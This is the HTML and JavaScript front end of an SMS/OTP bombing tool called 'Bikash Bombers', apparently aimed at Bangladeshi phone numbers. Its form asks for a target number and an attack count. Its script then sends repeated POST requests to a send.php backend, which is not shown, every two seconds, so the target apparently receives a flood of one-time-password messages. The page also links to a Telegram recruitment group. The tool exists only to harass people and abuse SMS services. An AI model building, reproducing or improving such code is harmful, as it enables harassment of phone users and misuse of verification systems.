<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hacker OTP Sender</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        /* Hacker Theme Colors */
        :root {
            --bg-color: #0d0d0d;
            --container-bg: #1a1a1a;
            --neon-green: #00ff41;
            --neon-red: #ff003c;
            --text-color: #00ff41;
            --input-bg: #000;
        }

        body { 
            font-family: 'Courier New', Courier, monospace; 
            background: var(--bg-color); 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
            color: var(--text-color);
        }

        .container { 
            background: var(--container-bg); 
            padding: 25px; 
            border-radius: 5px; 
            box-shadow: 0 0 20px rgba(0, 255, 65, 0.2); 
            width: 320px; 
            border: 1px solid var(--neon-green);
        }

        h2 { 
            text-align: center; 
            text-transform: uppercase;
            letter-spacing: 3px;
            margin-bottom: 25px;
            text-shadow: 0 0 10px var(--neon-green);
        }

        label { font-size: 13px; font-weight: bold; }

        input { 
            width: 100%; 
            padding: 12px; 
            margin: 10px 0 20px; 
            border: 1px solid var(--neon-green); 
            border-radius: 3px; 
            box-sizing: border-box; 
            background: var(--input-bg);
            color: var(--neon-green);
            font-family: 'Courier New', monospace;
            outline: none;
        }

        input:focus {
            box-shadow: 0 0 10px var(--neon-green);
        }
        
        /* Hacker Submit Button */
        #sendBtn { 
            width: 100%; 
            padding: 12px; 
            background: transparent; 
            color: var(--neon-green); 
            border: 1px solid var(--neon-green); 
            border-radius: 3px; 
            cursor: pointer; 
            font-size: 16px; 
            font-weight: bold; 
            text-transform: uppercase;
            transition: 0.3s; 
        }

        #sendBtn:hover { 
            background: var(--neon-green); 
            color: black;
            box-shadow: 0 0 20px var(--neon-green);
        }

        #sendBtn:disabled { 
            border-color: #444;
            color: #444;
            cursor: not-allowed; 
        }
        
        /* Telegram Button Style */
        .tg-btn {
            display: flex;
            align-items: center;
            justify-content: center;
            text-decoration: none;
            background: transparent;
            color: #00d2ff;
            border: 1px solid #00d2ff;
            padding: 10px;
            margin-top: 20px;
            border-radius: 3px;
            font-weight: bold;
            font-size: 13px;
            text-transform: uppercase;
            transition: 0.3s ease;
        }

        .tg-btn:hover { 
            background: #00d2ff; 
            color: black;
            box-shadow: 0 0 15px #00d2ff;
        }

        .tg-btn i { margin-right: 8px; font-size: 18px; }

        #status { 
            margin-top: 15px; 
            text-align: center; 
            font-size: 12px; 
            color: var(--neon-green);
            min-height: 20px;
        }

        /* Scanline Effect */
        .container::before {
            content: " ";
            display: block;
            position: absolute;
            top: 0; left: 0; bottom: 0; right: 0;
            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
            z-index: 2;
            pointer-events: none;
            background-size: 100% 2px, 3px 100%;
        }
    </style>
</head>
<body>

<div class="container">
    <h2>Bikash Bombers</h2>
    <label>> TARGET_NUMBER:</label>
    <input type="text" id="number" placeholder="01XXXXXXXXX">
    
    <label>> ATTACK_COUNT:</label>
    <input type="number" id="count" value="1">
    
    <button id="sendBtn" onclick="startSending()">Execute Attack</button>
    <div id="status"></div>

    <a href="https://t.me/+ySgl6S0nEZwwYWFl" target="_blank" class="tg-btn">
        <i class="fab fa-telegram-plane"></i> Join HQ Command
    </a>
</div>

<script>
    async function startSending() {
        const number = document.getElementById('number').value;
        const count = parseInt(document.getElementById('count').value);
        const btn = document.getElementById('sendBtn');
        const status = document.getElementById('status');

        if(number.length < 11) { 
            status.innerHTML = "<span style='color:red'>[!] ERROR: INVALID_TARGET</span>"; 
            return; 
        }

        btn.disabled = true;
        let success = 0;

        for (let i = 1; i <= count; i++) {
            status.innerHTML = `[+] INJECTING_PACKET: ${i}/${count}...`;
            
            try {
                const res = await fetch('send.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: `number=${encodeURIComponent(number)}`
                });
                
                if (res.ok) success++;
            } catch (err) { 
                console.error(err); 
            }

            await new Promise(r => setTimeout(r, 2000));
        }

        status.innerHTML = `<span style='color:var(--neon-green)'>[#] ATTACK_COMPLETE: ${success} SUCCESS</span>`;
        btn.disabled = false;
    }
</script>

</body>
</html>
